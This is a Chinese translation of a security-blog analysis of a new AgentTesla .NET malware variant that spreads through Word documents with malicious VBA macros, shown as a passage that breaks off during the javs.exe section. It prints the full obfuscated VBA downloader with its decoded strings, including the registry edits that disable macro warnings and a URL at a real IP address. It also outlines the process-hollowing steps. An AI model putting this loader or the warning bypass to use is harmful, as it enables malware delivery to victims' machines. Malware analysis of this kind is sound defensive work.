# 【技术分享】针对.NET恶意软件AgentTesla一个新变种的深度分析
|
##### 译文声明
本文是翻译文章，文章来源：blog.fortinet.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
****
译者：[eridanus96](http://bobao.360.cn/member/contribute?uid=2857535356)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**背景**
FortiGuard实验室近期捕获到了一些使用微软.Net框架开发的恶意软件，我们对其中比较典型的一个进行了分析。该恶意软件是AgentTesla家族的一个变种，通过含有能自动执行的恶意VBA宏的Word文档实现传播。本文将全面分析这一恶意软件是如何从用户机器中窃取信息的。下图是打开包含恶意代码的Word文档时的界面。
**对VBA代码的分析  
**
单击“Enable
Content”（启用内容）按钮后，会在后台偷偷执行恶意VBA宏。代码首先将一些键值写入设备的系统注册表中，以避免在下次打开带有不安全内容的Word文档时再出现宏安全警告。以下是写入注册表中的内容：
    HKCUSoftwareMicrosoftOffice{word version}WordSecurity,AccessVBOM, dword, 1 HKCUSoftwareMicrosoftOffice{word version}WordSecurity,VBAWarning, dword, 1
写入完成后，它会在一个新的Word进程中重新打开Word文档。这时，宏会再次执行，但这一次它执行的是不同的代码部分。在重新启动的Word程序中执行的宏，主要目的是动态获取一个新的VBA函数（ljRIpdKkSmQPMbnLdh）并得到它的调用。  
该函数如下：
    Sub ljRIpdKkSmQPMbnLdh()
        Dim dmvAQJch As String
        Dim JWyaIoTHtZaFG As String
        Dim TrbaApjsFydVkOGwjnzkpOB As String
        dmvAQJch = CreateObject(ThisDocument.bQYHDG("66627281787F833D6277747B7B", 15)).ExpandEnvironmentStrings(ThisDocument.bQYHDG("3463747C7F34", 15))
        JWyaIoTHtZaFG = ThisDocument.bQYHDG("6B", 15)
        TrbaApjsFydVkOGwjnzkpOB = ThisDocument.bQYHDG("797085823D748774", 15)
        dmvAQJch = dmvAQJch + JWyaIoTHtZaFG + TrbaApjsFydVkOGwjnzkpOB 
        Dim cllbWRRTqqWoZebEpYdGmnPBLAx As String
        cllbWRRTqqWoZebEpYdGmnPBLAx = ThisDocument.bQYHDG("7783837F493E3E43443D46463D42443D4142483E403E837E7370883D748774", 15)
        Dim OhYBGFWMcPWNnpvvuTeitVAK As Object
        Set OhYBGFWMcPWNnpvvuTeitVAK = CreateObject(ThisDocument.bQYHDG("5C7872817E827E75833D675C5B5763635F", 15))
        OhYBGFWMcPWNnpvvuTeitVAK.Open ThisDocument.bQYHDG("565463", 15), cllbWRRTqqWoZebEpYdGmnPBLAx, False 
        OhYBGFWMcPWNnpvvuTeitVAK.send
        If OhYBGFWMcPWNnpvvuTeitVAK.Status = 200 Then
            Dim BIPvJqwtceisuIuipCzbpsWRuhRwp As Object
            Set BIPvJqwtceisuIuipCzbpsWRuhRwp = CreateObject(ThisDocument.bQYHDG("50535E53513D62838174707C", 15))
            BIPvJqwtceisuIuipCzbpsWRuhRwp.Open
            BIPvJqwtceisuIuipCzbpsWRuhRwp.Type = 1
            BIPvJqwtceisuIuipCzbpsWRuhRwp.Write OhYBGFWMcPWNnpvvuTeitVAK.responseBody
            BIPvJqwtceisuIuipCzbpsWRuhRwp.SaveToFile dmvAQJch, 2
            BIPvJqwtceisuIuipCzbpsWRuhRwp.Close
        End If
        If Len(Dir(dmvAQJch)) <> 0 Then
            Dim TGoCeWgrszAukk
            TGoCeWgrszAukk = Shell(dmvAQJch, 0)
        End If
    End Sub
此函数中的所有关键部分都被编码。解码后如下：
    bQYHDG("66627281787F833D6277747B7B", 15) => “WScript.Shell”
    bQYHDG("3463747C7F34", 15) => “%Temp%”
    bQYHDG("797085823D748774", 15) => “javs.exe”
    bQYHDG("7783837F493E3E43443D46463D42443D4142483E403E837E7370883D748774", 15) => “hxxp://45.77.35.239/1/today.exe”
    bQYHDG("5C7872817E827E75833D675C5B5763635F", 15) => “Microsoft.XMLHTTP”
    bQYHDG("565463", 15) => “Get”
从上面高亮的关键字可以发现，此恶意软件可以下载一个可执行文件，并通过调用“Shell”函数运行该文件。具体来说，恶意软件是将“today.exe”文件下载到%Temp%目录下，重命名为“javs.exe”，然后运行。
**对javs.exe的分析**
从上图中PE分析工具的分析结果中，我们可以看到javs.exe是使用.NET框架构建的。然而这一文件使用了PDF相关的图标，用以迷惑用户。  
在执行后，它通过调用带有CREATE_SUSPENDED标志的CreateProcessA函数来启动另一个进程。这一过程将允许通过调用WriteProcessMemory函数来修改第二个进程的内存。最后，通过调用SetThreadContext和ResumeThread函数来恢复进程。